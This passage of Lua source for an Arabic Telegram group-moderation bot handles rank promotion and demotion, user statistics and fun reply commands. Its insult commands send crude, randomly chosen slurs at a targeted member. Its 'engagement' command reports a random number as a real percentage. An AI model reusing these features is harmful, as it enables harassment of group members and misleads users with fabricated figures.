Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevAbs:get(David..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevAbs:get(David..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevAbs:get(David..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n⌁︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n⌁︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n⌁︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
if text == "معرفي" and ChCheck(msg) then
function get_username(extra,result,success)
text = '⌁︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '⌁︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙@HMSEBOT', 1, 'md') end
if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevAbs:get(David..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevAbs:get(David..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "ايديي" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbs:del(David..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevAbs:del(David..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
if text == "المطور" then 
local DevCh1 = DevAbs:get(David.."DevAbs3")
local DevText = DevAbs:get(David.."DevText")
if DevCh1 then DevCh = '\n⌁︙*Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end 
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
if not DevAbs:get(David..'Abs:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function DavidTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(David) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1558668590) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevAbs:sismember(David.."Abs:AbsConstructor:"..msg.chat_id_,result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local DavidTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md') 
local DavidTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..DavidTEAM[math.random(#DavidTEAM)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DavidTEAM)
end
end
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevAbs:get(David..'Abs:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(David) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1558668590) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevAbs:sismember(David.."Abs:AbsConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local DavidTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md') 
local DavidTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DavidTEAM[math.random(#DavidTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevAbs:get(David..'Abs:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(David) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local DavidTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md') 
local DavidTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DavidTEAM[math.random(#DavidTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevAbs:get(David..'Abs:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(David) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local DavidTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md') 
local DavidTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DavidTEAM[math.random(#DavidTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevAbs:get(David..'Abs:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function DavidTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(David) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local DavidTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DavidTEAM, 1, 'md') 
local DavidTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..DavidTEAM[math.random(#DavidTEAM)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DavidTEAM)
end
end
end
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbs:sismember(David..'Abs:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(David..'Abs:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(David..'Abs:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbs:sismember(David..'Abs:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbs:sismember(David..'Abs:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(David..'Abs:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(David..'Abs:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
end
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(David..'Abs:SecondSudo:', result.sender_user_id_)
DevAbs:srem(David..'Abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(David..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbs:srem(David..'Abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(David..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbs:srem(David..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbs:sismember(David..'Abs:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(David..'Abs:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(David..'Abs:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbs:sismember(David..'Abs:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbs:sismember(David..'Abs:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(David..'Abs:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(David..'Abs:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(David..'Abs:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(David..'Abs:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(David..'Abs:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(David..'Abs:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
end 
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(David..'Abs:SecondSudo:', result.id_)
DevAbs:srem(David..'Abs:SudoBot:', result.id_)
DevAbs:srem(David..'Abs:ManagerAll:', result.id_)
DevAbs:srem(David..'Abs:AdminAll:', result.id_)
DevAbs:srem(David..'Abs:VipAll:', result.id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbs:srem(David..'Abs:SudoBot:', result.id_)
DevAbs:srem(David..'Abs:ManagerAll:', result.id_)
DevAbs:srem(David..'Abs:AdminAll:', result.id_)
DevAbs:srem(David..'Abs:VipAll:', result.id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbs:srem(David..'Abs:ManagerAll:', result.id_)
DevAbs:srem(David..'Abs:AdminAll:', result.id_)
DevAbs:srem(David..'Abs:VipAll:', result.id_)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(David..'Abs:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevAbs:sadd(David..'Abs:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
end
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and ChCheck(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and ChCheck(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevAbs:srem(David..'Abs:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
end end
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(David..'Abs:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
